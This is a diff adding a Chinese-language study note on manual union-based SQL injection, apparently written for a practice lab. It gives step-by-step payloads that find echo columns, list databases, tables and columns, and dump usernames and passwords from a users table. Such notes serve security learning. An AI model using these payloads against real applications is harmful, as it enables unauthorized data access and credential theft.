@@ -1,0 +1,70 @@
+# SQL 注入联合查询手工注入笔记
+
+## 1. 判断回显位
+
+说明数据库 `SELECT` 后面有三个东西，因此联合查询也对应三个回显位。
+
+```sql
+id=-2' union select 1,2,3--+
+```
+
+查询正确的数据会覆盖掉 `1,2,3`，所以要让人查询错误，使联合查询结果回显。
+
+## 2. 查看数据库的库名
+
+```sql
+id=-2' union select 1,database(),3--+
+```
+
+> 原文为 `databases()`，MySQL 中通常使用 `database()`。
+
+## 3. 查看表名
+
+```sql
+id=-2' union select 1,table_name,3
+from information_schema.tables
+where table_schema='security'
+limit 0,1--+
+```
+
+修改 `limit` 后的数值，依次查看表名。
+
+## 4. 查看该数据库下所有的表名
+
+```sql
+id=-2' union select 1,group_concat(table_name),3
+from information_schema.tables
+where table_schema='security'
+limit 0,1--+
+```
+
+## 5. 查看列名
+
+```sql
+id=-2' union select 1,column_name,3
+from information_schema.columns
+where table_schema='security'
+  and table_name='users'
+limit 0,1--+
+```
+
+## 6. 获取列中的数据
+
+```sql
+id=-2' union select 1,group_concat(username),group_concat(password)
+from users--+
+```
+
+查看该列全部数据。
+
+## 7. 逐条查看列数据
+
+```sql
+id=-2' union select 1,username,password
+from users
+limit 0,1--+
+```
+
+修改 `limit` 后的 `0`，依次调出数据。
+
+---
